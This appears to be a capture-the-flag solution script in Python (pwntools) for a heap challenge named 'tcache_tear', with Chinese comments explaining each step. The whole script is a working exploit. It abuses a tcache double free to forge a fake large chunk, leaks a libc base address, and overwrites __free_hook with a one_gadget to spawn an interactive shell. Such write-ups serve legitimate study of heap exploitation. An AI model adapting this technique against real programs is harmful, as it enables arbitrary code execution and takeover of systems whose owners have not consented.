from pwn import*
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '75'])
p = process('tcache_tear')
libc= ELF('libc-2.27.so')

def create(size, content):
    p.recvuntil('Your choice :')
    p.send(b'1\x00'.ljust(23, b'\x00'))
    p.recvuntil('Size:')
    p.send(bytes(str(size), 'utf-8').ljust(23, b'\x00'))
    p.recvuntil('Data:')
    p.send(content)
def free():
    p.recvuntil('Your choice :')
    p.send(b'2\x00'.ljust(23, b'\x00'))
def show():
    p.recvuntil('Your choice :')
    p.send(b'3\x00'.ljust(23, b'\x00'))

name = 0x602060
ptr  = 0x602088

# 在name伪造large chunk
p.recvuntil('Name:')
p.send((p64(0) + p64(0x501)).ljust(0x20, b'\x00')) 

# 在name+0x500的地方放入prev_inuse，防止将后一个不存在的chunk进行unlink
create(0x80, b'a')
free()
free()
create(0x80, p64(name + 0x500))
create(0x80, b'aaaaaaaa')
create(0x80, p64(0) + p64(0x21) + p64(0) + p64(0) + p64(0) + p64(0x21))

# 在name创建chunk后free，获得large bin
create(0x60, b'a')
free()
free()
create(0x60, p64(name + 0x10))
create(0x60, b'aaaaaaaa')
create(0x60, b'bbbbbbbb')
free()

# 泄露glibc
show()
p.recvuntil('Name :')
libc_base = u64(p.recv(0x20)[0x10:0x18]) - (0xbebca0 - 0x800000)
free_hook = libc_base + libc.symbols['__free_hook']
one_gadget= libc_base + 0x4f322
print('libc_base地址:' + hex(libc_base))

# 修改__free_hook为one_gadget
create(0x20, b'a')
free()
free()
create(0x20, p64(free_hook))
create(0x20, b'aaaaaaaa')
create(0x20, p64(one_gadget))
free()

# gdb.attach(p)

p.interactive()
